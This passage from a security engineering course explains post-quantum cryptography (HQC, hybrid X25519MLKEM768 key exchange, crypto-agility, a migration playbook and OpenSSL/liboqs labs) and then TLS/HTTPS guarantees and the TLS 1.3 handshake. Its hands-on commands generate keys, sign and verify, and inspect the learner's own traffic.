(decoding a random linear code is NP-hard) — completely different from lattices.
Larger keys/ciphertexts than ML-KEM (public key ~2.2–7.2 KB depending on level).
Its job is insurance: if a devastating attack on Module-LWE ever appears, HQC is
ready. Standard expected 2026–2027.

### The decision table

```
   NEED                         USE (2026)                    HEDGE / NOTES
   ----                         ----------                    -------------
   TLS / key exchange           HYBRID: X25519 + ML-KEM-768   (Chapter 25)
   General-purpose signature    ML-DSA-65                      or hybrid w/ Ed25519
   Firmware / boot / root CA    SLH-DSA (or LMS/XMSS if        conservative,
                                stateful mgmt is airtight)     hash-only
   Bandwidth-critical sig       wait for FN-DSA standard       ML-DSA meanwhile
   Backup KEM / crypto-agility  keep HQC on the roadmap        different maths
   Symmetric / hashing          AES-256, SHA-384+             no PQC needed
```

### Practice (25 min)

1. Make a table for your main project: every place it uses RSA/ECDH/ECDSA/EdDSA,
   and next to each, the PQC replacement from the decision table and the
   size delta (bytes before → after).
2. Estimate the handshake-size impact: if a TLS cert chain adds one ML-DSA-65
   key+signature at the leaf and one at the intermediate, how many extra bytes
   per handshake? (~2 × (1952 + 3309) ≈ 10.5 KB.) Would that break anything you
   run? (Check MTU-sensitive paths, QUIC initial limits, embedded flash sizes.)
3. Read the ML-KEM-768 parameters aloud until "1184-byte public key, 1088-byte
   ciphertext, 32-byte shared secret" is memorised. You'll cite these in design
   reviews.

### Common confusions

- **"Post-quantum means it runs on a quantum computer."** The opposite — it runs
  on ordinary computers and *resists* quantum attack.
- **"ML-KEM is a drop-in for ECDH."** It's a **KEM**, not a DH. The API shape
  differs (encapsulate / decapsulate). Protocols need adapting, though TLS 1.3
  already did.
- **"Just use SLH-DSA everywhere, it's the safest."** Its signatures are
  kilobytes and signing is slow. Wrong tool for high-volume TLS.
- **"Lattice crypto is unproven."** LWE has ~20 years of analysis and a
  worst-case-to-average-case reduction. The *structured* variants are newer;
  that's why hash-based and code-based hedges exist.
- **"We standardised these, so we're done."** Migration — inventory, hybrid
  rollout, crypto-agility — is the hard part. Chapter 25.

### Check yourself

1. Name the three finalised NIST PQC standards and what each is for.
2. What hard problem underlies ML-KEM and ML-DSA? Why doesn't Shor break it?
3. How does a KEM differ from Diffie–Hellman?
4. Give ML-KEM-768's public-key, ciphertext, and shared-secret sizes.
5. Why is SLH-DSA a poor fit for per-connection TLS signatures but a good fit for
   firmware signing?
6. Why did NIST standardise both lattice-based *and* hash/code-based algorithms?

### Further reading

- **Standards:** FIPS 203, 204, 205 (nvlpubs.nist.gov). Each has a clear intro
  section before the maths.
- **Site:** `pq-crystals.org` (Kyber/Dilithium) and `sphincs.org` — the
  designers' own pages, with specs and reference code.
- **Project:** Open Quantum Safe (`openquantumsafe.org`) — `liboqs` and the
  OpenSSL `oqs-provider`. How you experiment today.
- **Blog:** Cloudflare, "The state of the post-quantum Internet" (updated
  yearly) — deployment reality, with graphs.
- **Talk:** "Post-Quantum Cryptography: Detour or Destination?" and NIST's PQC
  standardisation retrospective talks on YouTube.

---

## Chapter 25 — Hybrid mode, crypto-agility, and how to migrate

### In one sentence

Deploy PQC **alongside** classical crypto (not instead of it) so you're safe if
*either* holds, and build your systems so swapping algorithms later is a config
change, not a rewrite.

### Why hybrid, not replace

The PQC algorithms are new. Lattice cryptanalysis is an active field. A
catastrophic classical break of ML-KEM in 2027 is unlikely but not impossible —
and it would be far worse to have bet everything on it.

```
   HYBRID KEY EXCHANGE

     shared_secret = KDF( X25519_secret  ||  ML-KEM-768_secret )

   To break this, an attacker must break BOTH:
     * X25519  -- needs a quantum computer
     * ML-KEM  -- needs a classical break of Module-LWE

   Safe as long as EITHER remains unbroken. You only lose if both fall.
```

This is why the real-world rollout is named `X25519MLKEM768`, not `MLKEM768`
alone. Chrome, Firefox, Cloudflare, AWS, and Google have had hybrid key exchange
on by default for most TLS 1.3 connections since 2024–2025. **If you use a modern
browser, you're already doing post-quantum key exchange on many sites.**

```
   Check your own browser: visit  pq.cloudflareresearch.com
   or run:  openssl s_client -connect cloudflare.com:443 -groups X25519MLKEM768
            then look for  "Negotiated TLS1.3 group: X25519MLKEM768"
```

For **signatures**, hybrid is messier (two signatures = two failure modes to
validate, bigger chains) and the HNDL urgency isn't there, so most deployments
are waiting or doing classical-now / PQC-ready.

### Crypto-agility — the real lesson

The deeper takeaway from this whole Part: **the specific algorithm will change
again.** Systems that hard-coded "RSA-2048" or "SHA-1" needed painful surgery.
Design so the next transition is easy.

```
   CRYPTO-AGILITY CHECKLIST

   [ ] Algorithms named in CONFIG, not compiled into logic.
   [ ] Every stored ciphertext / hash / signature carries an ALGORITHM ID
       and VERSION prefix, so you can tell old from new and migrate lazily.
         e.g.  v2:mlkem768:<data>     $argon2id$v=19$...   (Ch 10 does this)
   [ ] Key storage abstracted behind an interface (KMS/HSM), so key type
       is swappable.
   [ ] You can run TWO algorithms in parallel during a migration window
       (decrypt-with-either, verify-either, write-with-new).
   [ ] A documented, current CRYPTO INVENTORY: every algorithm, key size,
       key location, expiry, and owner. (You can't migrate what you can't see.)
   [ ] Certificate/key rotation is already automated and routine -- if
       rotating a key is scary, migration will be a disaster.
   [ ] Third-party dependencies audited for buried crypto (that old JWT
       library, the device SDK, the payment gateway).
```

### The migration playbook

```
   PHASE 0  INVENTORY (do this now, regardless of timeline)
            - enumerate every use of asymmetric crypto: TLS, SSH, VPN, JWT,
              code signing, DB/disk encryption key wrapping, backups, mTLS,
              document signing, firmware.
            - for each: algorithm, key size, key location, data lifetime,
              is it HNDL-sensitive?

   PHASE 1  PRIORITISE by (data-secrecy-lifetime) x (exposure)
            - long-lived confidential data over untrusted networks first
            - then authentication/signing
            - symmetric: just confirm AES-256 / SHA-384+ everywhere

   PHASE 2  UPGRADE THE PLUMBING
            - get to TLS 1.3, modern libraries (OpenSSL 3.5+, BoringSSL,
              Go 1.24+, rustls) that support ML-KEM
            - achieve crypto-agility (checklist above) -- this is most of
              the work and it's valuable even if PQC never mattered

   PHASE 3  ENABLE HYBRID KEY EXCHANGE
            - X25519MLKEM768 on TLS endpoints (often one config line or a
              library upgrade)
            - measure: handshake size, latency, CPU, and
              middlebox/"protocol ossification" breakage on old kit

   PHASE 4  PQC SIGNATURES / CERTIFICATES
            - as CAs and standards mature; test ML-DSA cert chains
            - firmware/boot signing -> SLH-DSA or stateful hash-based now
              (long device lifetimes, can't easily update the verifier)

   PHASE 5  DEPRECATE classical-only paths per the NIST/NCSC dates.
```

### Real-world example: SecureShop's PQC posture

Applying this to our running example (Chapter 4):

```
   shop.securesh.op  (customer TLS)
     -> Phase 3 now: enable X25519MLKEM768. Card data + PII crossing the
        internet is HNDL-sensitive (PCI + GDPR, 7-year retention).

   orders-api <-> database  (internal mTLS)
     -> internal network, shorter data-at-rest exposure, but backups live
        for years -> Phase 3 soon; ensure backup encryption uses AES-256
        with keys wrapped by a KMS you can re-wrap.

   deploy signing  (the Ch 22 release tool)
     -> Phase 4: plan ML-DSA-65 signatures; keep Ed25519 in hybrid until
        the toolchain is proven. Not HNDL-urgent.

   admin SSO / JWT (RS256)
     -> tokens live minutes; low HNDL risk. Migrate with the library
        upgrade cycle, not as an emergency.

   secure boot on the warehouse scanners (IoT)
     -> Phase 4 priority despite low data sensitivity: 10-year field life,
        no practical way to update the bootloader's trust anchor later
        -> SLH-DSA now.
```

Notice the priority order isn't "most sensitive data first" — it's driven by
*how long the exposure lasts* and *how hard the component is to change later*.

### Practice (40 min) — mini-project: crypto inventory

Produce a real deliverable you can reuse at work.

```
   1. Pick a system you know (a repo, a service, your home lab).
   2. Grep for crypto: `rsa`, `ec`, `ed25519`, `x25519`, `aes`, `sha`,
      `jwt`, `tls`, `ssl`, `certificate`, `PRIVATE KEY`, `KMS`, `bcrypt`.
      Check: TLS config, SSH config, CI secrets, IaC, container base images,
      language crypto calls, dependency lockfiles.
   3. Build a table: component | algorithm | key size | key location |
      data lifetime | HNDL-sensitive? | migration phase | owner.
   4. Identify the top 3 items to migrate first and justify the ordering
      using (secrecy-lifetime x exposure x difficulty-to-change-later).
   5. For one TLS endpoint, actually test hybrid:
        openssl s_client -connect <host>:443 -groups X25519MLKEM768 -brief
      (needs OpenSSL 3.5+). Record whether it negotiated.
```

Keep the table. This document *is* the migration project's foundation.

### Common confusions

- **"Hybrid is twice the risk (two algorithms to break)."** Backwards: hybrid is
  safe unless **both** break. It's twice the *safety margin*, at the cost of
  bigger messages.
- **"We'll migrate when quantum computers arrive."** Too late for HNDL data, and
  migrations take years. Inventory and agility work starts now.
- **"Crypto-agility is a PQC thing."** It's forever. SHA-1 → SHA-256, RSA →
  ECDSA, TLS 1.0 → 1.3 — every one was a slog for systems that hard-coded the
  algorithm.
- **"Enabling ML-KEM in TLS breaks old clients."** Hybrid groups are negotiated;
  clients that don't support them fall back to X25519. The real risk is
  *middlebox ossification* — old firewalls choking on larger ClientHellos — which
  is why you measure in Phase 3.

### Check yourself

1. What does a hybrid key exchange combine, and under what condition is it
   secure?
2. Why is the deployed construction called `X25519MLKEM768` and not just
   `MLKEM768`?
3. What is crypto-agility, and name three concrete things a crypto-agile system
   does.
4. Why does SecureShop prioritise the IoT bootloader over the admin JWTs, even
   though JWTs feel more security-critical?
5. What is the first phase of any PQC migration, and why can't you skip it?

### Further reading

- **Guide:** NSA/CISA/NIST joint "Quantum-Readiness: Migration to Post-Quantum
  Cryptography" — the inventory-first playbook.
- **RFC drafts:** `draft-ietf-tls-hybrid-design` and `draft-kwiatkowski-tls-
  ecdhe-mlkem` — how hybrid TLS key exchange actually works on the wire.
- **Blog:** AWS "Post-quantum cryptography" hub and Cloudflare's
  `blog.cloudflare.com/pq-2024` — real deployment data and pitfalls.
- **Tool:** `testssl.sh` and `pq.cloudflareresearch.com` — check what your
  endpoints and browser actually negotiate.
- **Report:** "Migration to Post-Quantum Cryptography" — NIST NCCoE practice
  guide (SP 1800-38), with worked enterprise scenarios.

---

## Chapter 26 — Hands-on: post-quantum with OpenSSL and liboqs

### Why this chapter exists

You should touch the real thing once: generate an ML-KEM keypair, do an
encapsulation, sign with ML-DSA, and negotiate a hybrid TLS handshake. Then it
stops being abstract.

### Getting a PQC-capable toolchain

```
   OPTION A -- OpenSSL 3.5+ (LTS, released April 2025)
     Native ML-KEM, ML-DSA, and SLH-DSA. No extra provider needed.
       brew install openssl@3        # ensure >= 3.5
       openssl list -kem-algorithms       | grep -i mlkem
       openssl list -signature-algorithms | grep -i -E 'ml-dsa|slh-dsa'

   OPTION B -- Open Quantum Safe provider (works with OpenSSL 3.0-3.4,
               and adds HQC, FN-DSA, and hybrids not yet in core)
       brew install liboqs oqs-provider     # or build from source
       openssl list -providers -provider oqsprovider
       # add to openssl.cnf, or pass:  -provider oqsprovider -provider default

   OPTION C -- language libraries
       Python:  pip install quantcrypt      (wraps liboqs)
       Go:      filippo.io/mlkem768, or Go 1.24+ crypto/mlkem
       Rust:    the `ml-kem` and `ml-dsa` crates (RustCrypto)
```

> **This machine:** `openssl version` here reports **LibreSSL 3.3.6**, which has
> **no** PQC support at all. Every command below needs OpenSSL 3.5+ or the OQS
> provider. Install one before running them — this is the §0.4 trap in its final
> form.

### 1. ML-KEM: generate, encapsulate, decapsulate

```bash
mkdir -p ~/sec-lab/pqc && cd ~/sec-lab/pqc

# Recipient generates a keypair
openssl genpkey -algorithm ML-KEM-768 -out mlkem_sk.pem
openssl pkey -in mlkem_sk.pem -pubout -out mlkem_pk.pem
wc -c mlkem_sk.pem mlkem_pk.pem          # note the ~1.2 KB public key

# Sender encapsulates: produces a ciphertext + a shared secret
openssl pkeyutl -encap -inkey mlkem_pk.pem -pubin \
        -out ct.bin -secret sender_secret.bin

# Recipient decapsulates: recovers the SAME shared secret
openssl pkeyutl -decap -inkey mlkem_sk.pem \
        -in ct.bin -secret recipient_secret.bin

xxd sender_secret.bin
xxd recipient_secret.bin
cmp sender_secret.bin recipient_secret.bin && echo "SHARED SECRETS MATCH"
ls -l ct.bin                              # ~1088 bytes for ML-KEM-768
```

Feed that 32-byte secret through HKDF (Chapter 22, step 4) to get AEAD keys —
exactly as you would with an X25519 secret.

### 2. ML-DSA: sign and verify

```bash
cd ~/sec-lab/pqc
openssl genpkey -algorithm ML-DSA-65 -out mldsa_sk.pem
openssl pkey -in mldsa_sk.pem -pubout -out mldsa_pk.pem

echo "release 6.0.0 -- first post-quantum build" > rel.txt
openssl pkeyutl -sign   -inkey mldsa_sk.pem -rawin -in rel.txt -out rel.sig
openssl pkeyutl -verify -pubin -inkey mldsa_pk.pem -rawin -in rel.txt \
        -sigfile rel.sig

ls -l rel.sig            # ~3.3 KB -- compare to 64 bytes for Ed25519
# tamper -> verification fails
echo "release 6.0.0 -- backdoored" > rel.txt
openssl pkeyutl -verify -pubin -inkey mldsa_pk.pem -rawin -in rel.txt \
        -sigfile rel.sig
```

### 3. SLH-DSA: the conservative signer (feel the cost)

```bash
cd ~/sec-lab/pqc
time openssl genpkey -algorithm SLH-DSA-SHA2-128s -out slh_sk.pem
openssl pkey -in slh_sk.pem -pubout -out slh_pk.pem
wc -c slh_pk.pem                         # tiny -- ~32 bytes of key material

echo "firmware image v3" > fw.txt
time openssl pkeyutl -sign -inkey slh_sk.pem -rawin -in fw.txt -out fw.sig
ls -l fw.sig                             # ~7.8 KB signature
time openssl pkeyutl -verify -pubin -inkey slh_pk.pem -rawin -in fw.txt \
        -sigfile fw.sig
```

Note the numbers: sub-32-byte key, ~8 KB signature, slow sign, fast-ish verify.
That profile is why SLH-DSA belongs on firmware, not TLS.

### 4. Hybrid post-quantum TLS handshake

```bash
# --- server: a throwaway self-signed cert is fine for this test ---
cd ~/sec-lab/pqc
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes \
        -keyout srv.key -out srv.crt -days 1 -subj "/CN=localhost"

openssl s_server -accept 4433 -cert srv.crt -key srv.key \
        -groups X25519MLKEM768 -tls1_3 -www &
SERVER=$!
sleep 1

# --- client: force the hybrid group and report what was negotiated ---
echo | openssl s_client -connect localhost:4433 \
        -groups X25519MLKEM768 -tls1_3 2>/dev/null \
        | grep -E "Negotiated TLS1.3 group|Cipher|Protocol"

kill $SERVER

# --- against the real internet ---
echo | openssl s_client -connect cloudflare.com:443 \
        -groups X25519MLKEM768 2>/dev/null \
        | grep -E "Negotiated TLS1.3 group|New, TLSv1.3"
```

You should see `Negotiated TLS1.3 group: X25519MLKEM768`. You just did a
post-quantum key exchange.

### 5. Benchmark PQC vs classical

```bash
openssl speed -provider default ml-kem-768 x25519 2>/dev/null | tail -6
openssl speed ml-dsa-65 ed25519 ecdsap256 2>/dev/null | tail -8
```

Typical findings: ML-KEM-768 is **faster** than X25519 for the operation itself;
the cost is bytes on the wire, not CPU. ML-DSA-65 signing is fast; its signatures
are large. SLH-DSA signing is genuinely slow.

### Practice / mini-project (75 min) — PQC-upgrade the release tool

Take the "signed release" tool from Chapter 22 and make it crypto-agile and
post-quantum ready:

```
   1. Add an algorithm field to the manifest header:
        {"sig_alg": "ed25519", ...}   or   {"sig_alg": "ml-dsa-65", ...}
        or  {"sig_alg": "hybrid-ed25519-mldsa65", ...}
   2. `keygen --alg <alg>` generates the right keypair(s).
   3. `sign` writes the sig_alg into the manifest and produces the
      matching signature(s). For hybrid: TWO signatures, both over the
      same manifest bytes.
   4. `verify`:
        - reads sig_alg from the manifest
        - for hybrid, requires BOTH signatures to verify
        - refuses unknown algorithms (fail closed)
   5. Test migration: sign a release with ed25519, then re-sign the SAME
      artifacts as hybrid, and confirm an old ed25519-only verifier still
      accepts the ed25519 signature while a new verifier checks both.
   6. Record signature sizes and sign/verify timings for each alg in a
      README table.

   Keep it under ~150 lines. This is a genuine pattern -- Sigstore,
   apt, and TLS libraries all carry an algorithm identifier for exactly
   this reason.
```

### Common confusions

- **"`openssl` on my Mac supports this."** The system `openssl` is LibreSSL with
  zero PQC. You must install OpenSSL 3.5+ or the OQS provider.
- **"ML-KEM `-encap` is like `-derive`."** Similar goal, different verb: `-encap`
  produces `(ciphertext, secret)`; the peer runs `-decap` on the ciphertext. No
  simultaneous exchange like ECDH.
- **"The shared secret from `-encap` is my key."** HKDF it first, same as always.
- **"Hybrid TLS needs a special certificate."** No — the *certificate* can stay
  classical (ECDSA/RSA) for now; only the *key exchange group* changes to
  `X25519MLKEM768`. PQC certificates are a later, separate step.

### Check yourself

1. What two `openssl pkeyutl` verbs implement an ML-KEM exchange, and who runs
   each?
2. Roughly how big is an ML-DSA-65 signature vs an Ed25519 one?
3. Why does SLH-DSA's performance profile suit firmware signing but not TLS?
4. In hybrid TLS, does the server certificate have to be post-quantum? What
   changes?
5. What does `openssl speed` tell you is the *real* cost of ML-KEM vs X25519?

### Further reading

- **Docs:** OpenSSL 3.5 release notes and the `openssl-pkeyutl(1)` man page
  (`-encap` / `-decap` / `-encp` sections).
- **Project:** Open Quantum Safe — `github.com/open-quantum-safe/oqs-provider`
  README walks through exactly these commands, including HQC and FN-DSA.
- **Tutorial:** Cloudflare's "Deep dive into a post-quantum key exchange" and
  AWS's "Round 2 post-quantum TLS" posts — annotated handshakes.
- **Interop:** `test.openquantumsafe.org` — public servers offering every PQC and
  hybrid combination for `s_client` testing.
- **Book:** *Serious Cryptography* (2nd ed.), Chapter 14 — pairs well with these
  labs.

---

### End of Part 6 — Milestone check

- [ ] I can explain why Shor breaks RSA/DH/ECC completely and Grover only dents
      symmetric crypto
- [ ] I can explain "harvest now, decrypt later" and why key-exchange migration
      is urgent for long-lived secrets
- [ ] I know the three finalised NIST PQC standards and what each replaces
- [ ] I can state ML-KEM-768's key/ciphertext/secret sizes from memory
- [ ] I understand why deployments use *hybrid* (X25519MLKEM768), not PQC alone
- [ ] I can list what makes a system crypto-agile
- [ ] **I have generated a crypto inventory for a real system**
- [ ] **I have done an ML-KEM encapsulation and a hybrid TLS handshake** (or know
      exactly which toolchain I need to)
- [ ] I upgraded the release tool to carry an algorithm identifier

---

# Part 7 — TLS and HTTPS

Everything so far — hashes, AEAD, key exchange, signatures, certificates — comes
together here. TLS is the protocol that secures the web, and understanding it end
to end is a core skill for a security engineer.

## Chapter 27 — What HTTPS actually guarantees (and what it doesn't)

### In one sentence

HTTPS is HTTP carried inside a TLS tunnel that provides **confidentiality**,
**integrity**, and **server authentication** between your browser and one
endpoint — and nothing beyond that.

### The problem: plain HTTP on a shared network

```
   You type http://bank.example and hit enter. Between you and the server:

     your laptop -> home router -> ISP -> transit networks -> hosting -> server

   On plain HTTP, ANY hop can:
     * READ everything      -- passwords, cookies, page contents
     * MODIFY everything    -- inject ads, malware, change bank details
     * IMPERSONATE the site -- you have no way to tell
     * REPLAY requests
```

Coffee-shop Wi-Fi, a compromised router, a malicious ISP, a nation-state tap on a
backbone cable — all are "a hop". HTTP assumes the network is trustworthy. It
never was.

### What TLS adds

```
   CONFIDENTIALITY   an eavesdropper sees only which SERVER you connected to
                     (IP, and the hostname via SNI/DNS) and rough traffic
                     SIZE and TIMING. Not the URL path, not headers, not body.

   INTEGRITY         any modification in transit is detected and the
                     connection is torn down (AEAD tag failure, Ch 15).

   SERVER            you are cryptographically sure you're talking to the
   AUTHENTICATION    holder of the private key for a certificate that a
                     trusted CA issued for THIS hostname (Ch 29).

   FORWARD SECRECY   (TLS 1.3, always) recording today + stealing the key
                     later does not decrypt past sessions (Ch 18).
```

### What TLS does NOT give you

This list matters as much as the previous one:

```
   [ ] It does not make the SERVER trustworthy. HTTPS to a phishing site is
       still a phishing site -- with a valid padlock. "Secure" != "safe".

   [ ] It does not hide WHICH site you visit. The destination IP is visible;
       the hostname leaks via the DNS lookup and via the TLS SNI field
       (unless Encrypted Client Hello / ECH is in use -- still rolling out).

   [ ] It does not protect data BEFORE or AFTER the tunnel. The server
       decrypts everything. Logs, backups, a breached database, a rogue
       admin, a subpoena -- all outside TLS's scope. (End-to-end encryption
       is a different, stronger property.)

   [ ] It does not authenticate the CLIENT by default. The server rarely
       knows who you are from TLS alone (mTLS is opt-in -- Ch 31).

   [ ] It does not stop application bugs. SQL injection, XSS, broken authz
       all travel happily inside a perfect TLS tunnel (Part 10).

   [ ] It does not defend against a MALICIOUS or MIS-ISSUED certificate,
       except that Certificate Transparency makes mis-issuance detectable
       after the fact (Ch 30).

   [ ] It does not hide traffic ANALYSIS. Packet sizes and timing can reveal
       which page you loaded, what video you're streaming, or what you typed.
```

### "The padlock means it's safe" — the enduring myth

```
   The padlock means: the connection to THIS server is encrypted and the
   server proved control of a certificate for THIS domain name.

   The padlock does NOT mean: the site is legitimate, honest, competent,
   or not run by criminals.

   Today the MAJORITY of phishing sites use HTTPS (free certs from ACME
   CAs). Browsers removed the word "Secure" from the address bar precisely
   because users read it as "trustworthy".
```

### The relationship to HTTP

```
   HTTPS = HTTP  +  TLS  +  (default port 443 instead of 80)

     Application:  HTTP/1.1, HTTP/2, or HTTP/3
     Security:     TLS 1.2 or 1.3   (TLS 1.3 for HTTP/2 in practice;
                                     HTTP/3 uses QUIC, which embeds TLS 1.3)
     Transport:    TCP (h1, h2)  or  UDP+QUIC (h3)
```

TLS is a generic secure-channel protocol. It also wraps SMTP, IMAP, LDAP,
gRPC, MQTT, syslog, and more. HTTPS is just its most visible user.

### Practice (20 min)

```bash
mkdir -p ~/sec-lab/scratch && cd ~/sec-lab/scratch

# 1. See plain HTTP in the clear (a deliberately-plaintext test host)
curl -v http://neverssl.com 2>&1 | head -20
# every header and byte here is visible to every hop

# 2. See what an eavesdropper learns from an HTTPS connection: the SNI
#    (hostname in the ClientHello) is currently NOT encrypted
sudo tcpdump -i any -n -A 'tcp port 443' -c 40 2>/dev/null | grep -a -i -E 'example|wikipedia' &
curl -s https://en.wikipedia.org/wiki/Transport_Layer_Security -o /dev/null
sleep 1; sudo pkill tcpdump 2>/dev/null
# you'll spot the hostname in the ClientHello, but nothing else

# 3. The padlock proves domain control, not honesty:
echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates
```

**Think it through:** you're on hostile Wi-Fi and load `https://news.example`.
List exactly what the network operator can and cannot learn. (Answer in
Appendix F.)

### Common confusions

- **"HTTPS means the website is safe."** It means the *channel* is secure. The
  site can still be malicious.
- **"HTTPS hides the URL."** It hides the path and query from the network; the
  hostname still leaks (DNS + SNI). Bookmarked, logged, and Referer-leaked URLs
  are unprotected.
- **"My data is encrypted end to end because I use HTTPS."** TLS terminates at the
  server (often at a load balancer *before* the server). The server sees
  plaintext. E2E encryption (Signal, etc.) is a stronger, separate design.
- **"TLS stops hackers."** It stops *network* attackers. Application
  vulnerabilities are untouched.

### Check yourself

1. Name the three core guarantees TLS provides.
2. List three things TLS explicitly does *not* protect.
3. What can a network eavesdropper still learn about your HTTPS traffic?
4. Why did browsers stop showing the word "Secure"?
5. Where does the TLS tunnel end, and why does that matter for your data?

*(Answers: Appendix F.)*

### Further reading

- **Book:** *Bulletproof TLS and PKI* (2nd ed.), Ivan Ristić — the definitive
  practical book on TLS. Chapters 1–2 for this material.
- **Site:** `howhttps.works` — an illustrated, beginner-friendly walkthrough.
- **Video:** Computerphile, "How HTTPS Works" and "TLS Handshake".
- **Article:** "Is the padlock icon a lie?" — various write-ups on why the UI
  changed; search the Chromium security team's posts.

---

## Chapter 28 — The TLS 1.3 handshake, step by step

### In one sentence

TLS 1.3 establishes an authenticated, forward-secret encrypted channel in **one
round trip**, by having the client guess the key-exchange group and send its
share immediately.

### Why TLS 1.3 and not 1.2

| | TLS 1.2 (2008) | TLS 1.3 (2018) |
|---|---|---|
| Handshake round trips | 2 | **1** (0 with resumption) |
| Key exchange | RSA transport *or* (EC)DHE | **(EC)DHE only** — forward secrecy always |
| Cipher suites | 300+, many broken (RC4, 3DES, CBC, export) | **5**, all AEAD |
| Negotiation | in the clear, downgrade-prone | mostly encrypted, downgrade-protected |
| Vulnerable to | BEAST, CRIME, Lucky13, POODLE, ROBOT, FREAK, Logjam... | none of that class by design |
| MD5/SHA-1 in handshake | yes | removed |

**Use TLS 1.3. Support 1.2 only for legacy clients. Disable 1.0 and 1.1 (dead
since 2021) and SSLv3 (dead since 2015).**

### The five TLS 1.3 cipher suites (the whole list)

```
   TLS_AES_128_GCM_SHA256          <- mandatory to implement
   TLS_AES_256_GCM_SHA384         <- prefer this (Ch 23: 256-bit for PQ)
   TLS_CHACHA20_POLY1305_SHA256   <- prefer on devices without AES-NI
   TLS_AES_128_CCM_SHA256         <- constrained / IoT
   TLS_AES_128_CCM_8_SHA256       <- constrained, short tag (avoid if you can)
```

Notice a suite name no longer bundles a key exchange or a signature algorithm —
those are negotiated separately in TLS 1.3. A suite is just **AEAD + hash**.

### The handshake, message by message

```
   CLIENT                                                    SERVER
   ------                                                    ------

   ClientHello  ------------------------------------------->
     - TLS version(s) supported (pretends 1.2 for middleboxes,
       signals 1.3 via "supported_versions" extension)
     - client random (32 bytes)
     - list of cipher suites
     - "key_share": client's EPHEMERAL ECDHE public key(s),
        e.g. X25519 -- sent NOW, as a guess, to save a round trip
     - "supported_groups", "signature_algorithms"
     - SNI: the hostname it wants (server_name extension)
     - optional: PSK / session ticket for resumption, early_data

                <------------------------------------------- ServerHello
                  - chosen cipher suite
                  - server random (32 bytes)
                  - "key_share": server's ephemeral ECDHE public key

   *** Both sides now run ECDHE -> shared secret -> HKDF ->
       a set of keys. EVERYTHING BELOW THIS LINE IS ENCRYPTED. ***

                <------------------------------------------- {EncryptedExtensions}
                <------------------------------------------- {Certificate}
                  - the server's certificate chain (leaf + intermediates)
                <------------------------------------------- {CertificateVerify}
                  - a SIGNATURE, with the cert's private key, over a
                    transcript hash of the handshake so far.
                    THIS is what proves the server holds the private key
                    for the cert -- ties identity to this exact session.
                <------------------------------------------- {Finished}
                  - HMAC over the whole transcript (integrity of the
                    handshake itself; downgrade/tamper protection)

   {Finished}   ------------------------------------------->
                  - client's transcript HMAC

   [Application Data] <====================================> [Application Data]
     HTTP requests/responses, protected by the negotiated AEAD
```

`{ }` = encrypted with handshake keys. `[ ]` = encrypted with application keys.
One round trip from ClientHello to sending real data.

### What each cryptographic piece is doing

```
   client/server randoms  -> ensure each handshake is unique (anti-replay
                             into the key schedule)
   ECDHE key_share         -> forward-secret shared secret (Ch 18, 20)
   HKDF key schedule       -> derives distinct keys for handshake, application,
                             each direction, plus exporter/resumption secrets
   Certificate             -> "here is my identity" (Ch 29)
   CertificateVerify       -> "and I can prove I own it, RIGHT NOW, for THIS
                             handshake" (signature over the transcript)
   Finished (both sides)   -> "the handshake you saw is the handshake I saw"
                             -> defeats downgrade and tampering
```

The combination is what stops a man-in-the-middle: an attacker can relay bytes,
but cannot produce a valid `CertificateVerify` for the real domain (no private
key) and cannot forge the `Finished` MAC (no keys).

### 0-RTT resumption (and its one danger)

If the client has a PSK/ticket from a previous session, it can send application
data **in the very first flight** ("early data", 0-RTT):

```
   + zero round trips before the first request -- great for latency

   - REPLAYABLE. An attacker who captures the 0-RTT data can re-send it.
     For a GET it's usually harmless; for "POST /transfer" it is not.

   Rule: only allow 0-RTT for idempotent, non-state-changing requests.
   Most servers restrict it to GET/HEAD or disable it. Know your config.
```

### Where each Part's concepts show up

```
   Part 3 (hashing)      -> transcript hash, HKDF, Finished HMAC
   Part 4 (AEAD)         -> the record protection (AES-GCM / ChaCha20-Poly1305)
   Part 5 (asymmetric)   -> ECDHE key exchange + certificate signature
   Part 6 (PQC)          -> key_share can be X25519MLKEM768 (hybrid)
   Part 7 (this)         -> the choreography that assembles them safely
```

### Practice (35 min)

```bash
cd ~/sec-lab/scratch

# 1. Watch a full handshake in detail
openssl s_client -connect wikipedia.org:443 -servername wikipedia.org \
        -tls1_3 -msg -state 2>&1 | sed -n '1,60p'

# 2. Force each version and see what negotiates / fails
for v in tls1_3 tls1_2 tls1_1; do
  echo "--- $v ---"
  echo | openssl s_client -connect wikipedia.org:443 -servername wikipedia.org \
        -$v 2>&1 | grep -E "Protocol|Cipher|handshake failure|no protocols"
done

# 3. See the key exchange group (forward secrecy in action)
echo | openssl s_client -connect wikipedia.org:443 -servername wikipedia.org \
        2>&1 | grep -E "Server Temp Key|Negotiated .* group"

# 4. Capture a handshake and read it in Wireshark
sudo tcpdump -i any -w /tmp/tls13.pcap 'tcp port 443' -c 60 &
curl -s https://wikipedia.org -o /dev/null; sleep 1; sudo pkill tcpdump
echo "open /tmp/tls13.pcap in Wireshark; filter: tls.handshake"
# In TLS 1.3 you'll see ClientHello and ServerHello in the clear,
# then everything else shows as 'Application Data' -- because the
# rest of the handshake is already encrypted.

# 5. TLS 1.3 with a keylog, so Wireshark CAN decrypt (your own traffic only)
SSLKEYLOGFILE=/tmp/keys.log curl -s https://wikipedia.org -o /dev/null
# In Wireshark: Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log
#   filename = /tmp/keys.log   -> now the encrypted handshake decrypts
```

### Common confusions

- **"TLS 1.3 handshake is encrypted."** ClientHello and ServerHello are *not* (the
  keys don't exist yet). Everything after ServerHello is. SNI is in the clear
  unless ECH is used.
- **"The certificate proves the server is safe."** It proves domain control. The
  `CertificateVerify` signature proves the server holds the matching private key
  for *this* handshake.
- **"0-RTT is just faster, use it everywhere."** It's replayable. Restrict to
  idempotent requests.
- **"RSA key exchange is still a thing."** Removed in TLS 1.3. If you see
  `TLS_RSA_WITH_...` it's TLS 1.2 or older, and it has no forward secrecy.
- **"More cipher suites = more secure."** TLS 1.3 deliberately has five, all safe.
  Long suite lists were a TLS 1.2 liability.

### Check yourself

1. How many round trips does a full TLS 1.3 handshake take? What about
   resumption?
2. What does `CertificateVerify` prove that the `Certificate` message alone does
   not?
3. What is the `Finished` message for?
4. Why is 0-RTT data dangerous, and what requests may safely use it?
5. Which parts of a TLS 1.3 handshake are visible to a passive eavesdropper?
6. Why does the client send a `key_share` in the ClientHello before knowing what
   the server supports?

